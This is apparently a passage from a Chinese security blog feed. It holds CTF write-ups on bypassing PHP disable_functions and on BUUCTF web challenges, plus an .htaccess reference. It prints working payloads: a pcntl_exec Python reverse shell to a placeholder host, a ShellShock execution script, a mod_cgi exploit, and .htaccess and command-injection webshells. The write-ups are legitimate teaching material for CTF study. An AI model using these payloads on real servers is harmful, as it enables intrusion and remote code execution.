class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so</code></pre><p>执行</p><p><img src="/2021/08/13/ff/6.png" alt="6"></p><p>也可以直接用蚁剑的插件disabled_functions,选择模式后会在<code>/var/www/html</code>目录里上传一个<code>.antproxy.php</code>文件。我们创建副本, 并将连接的 URL shell 脚本名字改为<code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令。</p><h4 id="利用-pcntl-exec"><a class="header-anchor" href="#利用-pcntl-exec">🍭</a>利用 pcntl_exec</h4><p>条件：PHP安装并启用了pcntl插件</p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但经常忽略pcntl扩展的相关函数。pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>利用pcntl_exec()<a href="http://xn--test-pk6hg45q.sh">执行test.sh</a>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(function_exists(<span class="hljs-string">&#x27;pcntl_exec&#x27;</span>)) &#123;   pcntl_exec(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/test.sh&quot;</span>));&#125; <span class="hljs-keyword">else</span> &#123;       <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;pcntl extension is not support!&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>pcntl_exec()执行命令没有回显，常与python结合来反弹shell：</p><pre><code class="hljs javascript">&lt;?php pcntl_exec(<span class="hljs-string">&quot;/usr/bin/python&quot;</span>,array(<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</code></pre><p>[第四届“蓝帽杯”决赛]php这道题利用的就是这个点。</p><h5 id="利用-ShellShock（CVE-2014-6271）"><a class="header-anchor" href="#利用-ShellShock（CVE-2014-6271）">🍭</a>利用 ShellShock（CVE-2014-6271）</h5><p>这个洞比较老，而且现在没怎么见过，蚁剑终端集成了对 ShellShock 的利用，可以直接执行命令。</p><h5 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h5><p>Linux 操作系统 <code>putenv()</code>、<code>mail()</code>或<code>error_log()</code>函数可用 目标系统的<code>/bin/bash</code>存在<code>CVE-2014-6271</code>漏洞 <code>/bin/sh -&gt; /bin/bash</code>sh 默认的 shell 是 bash</p><h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5><p>Bash使用的环境变量是通过函数名称来调用的，导致该漏洞出现是以<code>()&#123;</code>开头定义的环境变量在命令 ENV 中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。一般函数体内的代码不会被执行，但该漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。</p><h5 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h5><p>蚁剑终端或手动利用：</p><p>在有权限的目录中（/var/tmp）上传以下利用脚本：</p><pre><code class="hljs javascript">&lt;?php <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params">$cmd</span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   $tmp = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>);    putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>);    error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);   $output = @file_get_contents($tmp);    @unlink($tmp);    <span class="hljs-keyword">if</span>($output != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> $output;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; &#125; echo shellshock($_REQUEST[<span class="hljs-string">&quot;cmd&quot;</span>]); ?&gt;</code></pre><p>包含该脚本，传参即可。</p><h4 id="利用-Apache-Mod-CGI"><a class="header-anchor" href="#利用-Apache-Mod-CGI">🍭</a>利用 Apache Mod CGI</h4><h5 id="条件-v3"><a class="header-anchor" href="#条件-v3">🍭</a>条件</h5><p>Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了<code>cgi</code>、<code>rewrite</code> Web 目录给了<code>AllowOverride</code>权限 当前目录可写</p><h5 id="原理-v3"><a class="header-anchor" href="#原理-v3">🍭</a>原理</h5><p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。之后出现了动态技术，但是Web服务器不能直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通就出现了CGI（Common Gateway Interface）通用网关接口。</p><p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，效率很低。而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。相当于Web服务器启动的时就启动相应模块。当有新的动态请求进来时，Web服务器能自己解析这些动态脚本。</p><p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本：</p><ul><li>文件具有已由AddType指令定义的扩展名</li><li>文件位于ScriptAlias目录中</li></ul><p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p><pre><code class="hljs javascript">Options +ExecCGIAddHandler cgi-script .xxx</code></pre><p>这样当前目录下的所有的.xxx文件会当做CGI程序执行。故我们可以利用CGI来执行系统命令绕过disable_functions</p><h5 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h5><p>搭建个 <a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a> 项目来测试</p><p><img src="/2021/08/13/ff/7.png" alt="7"></p><p>连接后终端无法执行：</p><p><img src="/2021/08/13/ff/8.png" alt="8"></p><p>目标主机开启了CGI，Web目录下有写入的权限。我们可以上传创建 .htaccess ：</p><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGIAddHandler cgi-script .<span class="hljs-keyword">ant</span></code></pre><p>shell.ant:</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-built_in">echo</span> Content-type: text/html<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">echo</span>&amp;&amp;id</code></pre><p>注：linux中CGI比较严格，上传后可能会发现状态码500，无法解析bash。因为目标站点是linux环境，若用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p><p><img src="/2021/08/13/ff/11.png" alt="11"></p><p>添加权限：</p><pre><code class="hljs gradle">?<span class="hljs-keyword">ant</span>=chmod(<span class="hljs-string">&#x27;shell.ant&#x27;</span>,<span class="hljs-number">0777</span>);</code></pre><p>访问便可执行</p><p><img src="/2021/08/13/ff/12.png" alt="12"></p><p>POC</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$cmd = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//command to be executed</span>$shellfile = <span class="hljs-string">&quot;#!/bin/bashn&quot;</span>; <span class="hljs-comment">//using a shellscript</span>$shellfile .= <span class="hljs-string">&quot;echo -ne &quot;</span>Content-Type: text/html\n\n<span class="hljs-string">&quot;n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span>$shellfile .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params">$text,$condition,$yes,$no</span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . ($condition ? $yes : $no) . <span class="hljs-string">&quot;&lt;br&gt;n&quot;</span>;&#125;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;checked&#x27;</span>]))&#123;    @file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>    header(<span class="hljs-string">&#x27;Location: &#x27;</span> . $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span>&#125;<span class="hljs-keyword">else</span>&#123;    $modcgi = in_array(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, apache_get_modules()); <span class="hljs-comment">// mod_cgi enabled?</span>    $writable = is_writable(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span>    $htaccess = !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span>        checkEnabled(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,$modcgi,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;Is writable&quot;</span>,$writable,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;htaccess working&quot;</span>,$htaccess,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);    <span class="hljs-keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))    &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span>    &#125;    <span class="hljs-keyword">else</span>    &#123;        checkEnabled(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,copy(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span>        checkEnabled(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span>        checkEnabled(<span class="hljs-string">&quot;Write shell file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,$shellfile),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span>        checkEnabled(<span class="hljs-string">&quot;Chmod 777&quot;</span>,chmod(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span>    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>也可用蚁剑插件</p><p><img src="/2021/08/13/ff/10.png" alt="10"></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu（八）</title>
    <link href="/2021/08/11/ffi/"/>
    <url>/2021/08/11/ffi/</url>
    
    <content type="html"><![CDATA[<h1>[XNUCA2019Qualifier]EasyPHP</h1><h4 id="分析源码"><a class="header-anchor" href="#分析源码">🍭</a>分析源码</h4><p><img src="/2021/08/11/ffi/2.png" alt="2"></p><p>题目服务器中间件为 Apache，因此可以传 .htaceess 利用自定义错误文件写Webshell。</p><h5 id="使-htaccess-生效"><a class="header-anchor" href="#使-htaccess-生效">🍭</a>使 .htaccess 生效</h5><p>我们写入的内容会被自动在末尾加上“\nJust one chance”，会使上传的.htaccess文件不生效，我们可以采用 <code>\</code> 的方式将换行符转义成普通字符，然后用 <code>#</code> 来注释单行：</p><pre><code class="hljs javascript">......# \\nJust one chance</code></pre><h5 id="include-path"><a class="header-anchor" href="#include-path">🍭</a>include_path</h5><p>在题目的代码中有一处 <code>include_once(&quot;fl3g.php&quot;);</code>，但是当我们访问fl3g.php文件时却发现该文件并不存在，这里便用到了php.ini中的include_path选项。</p><p>include_path可以用来设置include()或require()函数包含文件的参考目录路径，也就是说当使用include()或require()函数包含文件的时候，程序首先以include_path设置的路径作为参考点去找文件，如果找不到，则以程序自身所在的路径为参考点去找所要的文件，如果都找不到，则出错，那么我们就可以通过修改它来控制include的路径，那么如果我们能够在其它目录写入同名的fl3g.php让其包含，那么就能够getshell，并且可以使fl3g.php文件不被删除。</p><h5 id="指定目录写文件（error-log）"><a class="header-anchor" href="#指定目录写文件（error-log）">🍭</a>指定目录写文件（error_log）</h5><p>前面我们已经了解了，error_log 可以将 PHP 运行报错的记录写到指定文件中，利用这一点我们可以写Webshell。但是如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将 payload 作为一个路径去访问时就会因为找不到fl3g.php而报错，并将报错记录在指定的错误文件中。</p><p>但是前面也说了，当我们传递 PHP 的 payload 时，因为我们传过去的内容会经过 html 编码，所以我们需要用 UTF-7 来绕过：</p><pre><code class="hljs javascript">php_value include_path &quot;+ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-&quot;php_value error_log /tmp/fl3g.php# \</code></pre><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>写入 .htaccess error_log 相关的配置，将 payload 写入目标文件</p><p>将构造的payload进行url编码并执行</p><pre><code class="hljs angelscript">/index.php?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>include_path%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>BADw%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval(%<span class="hljs-number">2</span>BACQAXw-POST%<span class="hljs-number">2</span>BAFs-whoami%<span class="hljs-number">2</span>BAF0)%<span class="hljs-number">2</span>BADs%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>BAD4-%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>Aphp_value%<span class="hljs-number">20</span>error_log%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ffl3g.php%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>C</code></pre><p>然后访问 index.php 触发报错留下 error_log。再写入 .htaccess 新的配置，将 include_path 选项设定为刚才生成的fl3g.php的目录,并配置解析的编码为 UTF-7：</p><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> include_path <span class="hljs-string">&quot;/tmp&quot;</span>php_fl\    # 这里使用\加换行的方式绕过对<span class="hljs-string">&quot;flag&quot;</span>的过滤, 即php_flag zend.multibyte <span class="hljs-number">1</span>ag zend.multibyte <span class="hljs-number">1</span>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span># \</code></pre><p>url编码后执行：</p><pre><code class="hljs angelscript">/index.php?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>include_path%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>Aphp_fl%<span class="hljs-number">5</span>C%<span class="hljs-number">0</span>Aag%<span class="hljs-number">20</span>zend.multibyte%<span class="hljs-number">201</span>%<span class="hljs-number">0</span>Aphp_value%<span class="hljs-number">20</span>zend.script_encoding%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>UTF<span class="hljs-number">-7</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>C</code></pre><p>读取flag：</p><p><img src="/2021/08/11/ffi/3.png" alt="3"></p><p>解二：包含 .htaccess 自身的方法Getshell:</p><pre><code class="hljs php-template"><span class="xml">php_value auto_prepend_fi\le &quot;.htaccess&quot;#</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">\</span></code></pre><p>因为后面会拼接字符串， 采用.htaccess的单行注释绕过 # \，这里反斜杠本来就有拼接上下两行的功能，因此这里本来就可以直接使用\来连接被过滤掉的关键字来写入.htaccess</p><img src="/2021/08/11/ffi/7.png" alt="7" style="zoom:50%;"><p>解三：正则回朔绕过正则匹配</p><pre><code class="hljs angelscript">php_value pcre.backtrack_limit <span class="hljs-number">0</span>php_value pcre.jit <span class="hljs-number">0</span></code></pre><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code> 而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此可以通过php_value 设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，那么当超过此次数以后将返回false。//绕过filename的过滤直接写shell</p><p>payload</p><pre><code class="hljs php-template"><span class="xml">php_value pcre.backtrack_limit    0</span><span class="xml">php_value auto_append_file    &quot;.htaccess&quot;</span><span class="xml">php_value pcre.jit   0</span><span class="xml">#aa</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">\</span></code></pre><p>filename=php://filter/write=convert.base64-decode/resource=.htaccess// content绕过stristr，然后getshell。</p><h1>[羊城杯 2020]Easyphp</h1><p>题目给了源码，跟[XNUCA2019Qualifier]EasyPHP一样，只不过少了<code>include_once(&quot;fl3g.php&quot;);</code>，将payload一的include_path去掉，就可以用在这一题，payload2,3同理可用</p><p><img src="/2021/08/11/ffi/6.png" alt="6"></p><p>也可以直接传一句话，因为这题没有include_once</p><h1>[羊城杯 2020]Easyphp2</h1><p>进入题目页面，发现url<code>/?file=GWHT.php</code>,应该是文件包含，尝试伪协议读取，发现base64和rot13都被ban掉，但<code>convert.quoted-printable-encode</code>没ban，读取文件：</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.quoted-printable-encode/</span>resource=GWHT.php</code></pre><p>1<img src="/2021/08/11/ffi/4.png" alt="4" style="zoom: 33%;"></p><p>也可以用base编码，url两次编码即可绕过限制：</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.%6%32ase64-encode/</span>resource=GWHT.php</code></pre><p>解码后整理一下有用的代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-number">5</span>);   <span class="hljs-keyword">if</span> ($_COOKIE[<span class="hljs-string">&#x27;pass&#x27;</span>] !== getenv(<span class="hljs-string">&#x27;PASS&#x27;</span>)) &#123;       setcookie(<span class="hljs-string">&#x27;pass&#x27;</span>, <span class="hljs-string">&#x27;PASS&#x27;</span>);       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="hljs-string">&#x27;404&#x27;</span>.<span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="hljs-string">&#x27;23333&#x27;</span>);   &#125;   <span class="hljs-meta">?&gt;</span>   <span class="hljs-meta">&lt;?php</span>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;count&quot;</span>])) &#123;       $count = $_GET[<span class="hljs-string">&quot;count&quot;</span>];       <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);       &#125;       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="hljs-string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="hljs-string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;   &#125;   <span class="hljs-meta">?&gt;</span></code></pre><p>先判断cookie，GET传count参数；设置了一个执行时间，需要得到环境变量的值；robots.txt得到提示读check：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass = <span class="hljs-string">&quot;GWHT&quot;</span>;<span class="hljs-comment">// Cookie password.</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);</code></pre><p>得到密码，命令执行exec(‘printf ‘’ . $count . ‘’ | wc -c’)，exec命令无回显，可以直接写入shell：</p><pre><code class="hljs mojolicious"><span class="xml">?file=GWHT.php&amp;count=&#x27;|echo+&quot;<span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"><span class="hljs-number">3</span>f%3d+<span class="hljs-keyword">eval</span>(\$_POST[<span class="hljs-string">&#x27;shell&#x27;</span>])%3f&gt;<span class="hljs-string">&quot;+&gt;+a.php&#x27;</span></span></code></pre><p>连接蚁剑，<code>find / -name &quot;flag*&quot;</code>找到flag路径，权限问题读不了/GWHT/system/of/a/down/flag.txt，在README里面有个hash，MD5解码为GWHTCTF，</p><p><img src="/2021/08/11/ffi/5.png" alt="5"></p><p>参考：<a href="https://www.cnblogs.com/twosmi1e/p/14230691.html#">https://www.cnblogs.com/twosmi1e/p/14230691.html#</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.htaccess总结</title>
    <link href="/2021/08/10/hta/"/>
    <url>/2021/08/10/hta/</url>
    
    <content type="html"><![CDATA[<p>经常碰到一些题目需要借助.htaccess，且用法很多，这里来做一个总结。</p><h4 id="概念"><a class="header-anchor" href="#概念">🍭</a>概念</h4><p>.htaccess文件(“分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，  即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，  以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<a href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>指令来设置。</p><p>.htaccess 中有 <code>#</code> 单行注释符，且支持 <code>\</code> 拼接上下两行。</p><p>.htaccess 文件中的配置指令作用于 .htaccess 文件所在的<strong>目录及其所有子目录</strong>，但其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的  .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p><h4 id="配置"><a class="header-anchor" href="#配置">🍭</a>配置</h4><pre><code class="hljs css"><span class="hljs-selector-tag">AllowOverride</span>  <span class="hljs-selector-tag">All</span>    # 启动<span class="hljs-selector-class">.htaccess</span>文件的使用<span class="hljs-selector-tag">AccessFileName</span>  <span class="hljs-selector-class">.config</span>    # 将<span class="hljs-selector-class">.htaccess</span>修改为<span class="hljs-selector-class">.config</span></code></pre><h4 id="作用"><a class="header-anchor" href="#作用">🍭</a>作用</h4><p>可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><h4 id="SetHandler"><a class="header-anchor" href="#SetHandler">🍭</a>SetHandler</h4><p>可以强制所有匹配的文件被一个指定的处理器处理。</p><p>用法：</p><pre><code class="hljs pgsql">SetHandler <span class="hljs-keyword">handler</span>-<span class="hljs-type">name</span>|<span class="hljs-keyword">None</span></code></pre><p>如：</p><pre><code class="hljs applescript">SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<span class="hljs-comment">#当前目录及其子目录下所有文件都会被当做 php 解析</span>SetHandler server-status<span class="hljs-comment">#开启 Apache 的服务器状态信息（server-status 是 Apache 自带一个查看 Apache 状态的功能模块），可以查看所有访问本站的记录</span></code></pre><h4 id="AddHandler"><a class="header-anchor" href="#AddHandler">🍭</a>AddHandler</h4><p>实现在文件扩展名与特定的处理器之间建立映射</p><p>用法：</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>handler-name <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre><p>如：</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<span class="hljs-comment">#将扩展名为 .xxx 的文件作为 CGI 脚本来处理</span></code></pre><h4 id="php-value"><a class="header-anchor" href="#php-value">🍭</a>php_value</h4><p>设定指定的 PHP 的配置值。要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。</p><p>用法：</p><pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> name <span class="hljs-keyword">value</span></code></pre><p>不是所有的 PHP 配置都可以用 php_value 来设定，它只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令：</p><p><img src="/2021/08/10/hta/1.png" alt="1"></p><p>如</p><pre><code class="hljs css"><span class="hljs-selector-tag">php_value</span> <span class="hljs-selector-tag">auto_prepend_file</span> <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span>#设置访问一个 <span class="hljs-selector-tag">PHP</span> 文件时，在该文件解析之前会先自动包含并解析 <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span> 文件</code></pre><h4 id="php-flag"><a class="header-anchor" href="#php-flag">🍭</a>php_flag</h4><p>设定布尔值类型的 PHP 配置选项。</p><p>用法：</p><pre><code class="hljs applescript">php_flag <span class="hljs-built_in">name</span> <span class="hljs-keyword">on</span>|off</code></pre><p>php_flag 可以设定的配置也是有范围的：</p><p><img src="/2021/08/10/hta/2.png" alt="2"></p><p>实例</p><pre><code class="hljs angelscript">php_flag engine <span class="hljs-number">0</span>#将 engine 设置为 <span class="hljs-number">0</span>，即在本目录和子目录中关闭 PHP 解析，可以造成源码泄露</code></pre><h4 id="AddType"><a class="header-anchor" href="#AddType">🍭</a>AddType</h4><p>将给定的文件扩展名映射到指定的内容类型。</p><p>用法：</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddType </span>media-type <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre><p>如</p><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .gif<span class="hljs-comment">#把 gif 为后缀的文件当做 php 文件解析。</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php png jpg gif<span class="hljs-comment">#把 .png .jpg .gif 多个后缀的文件当做 php 解析</span></code></pre><h2 id="利用"><a class="header-anchor" 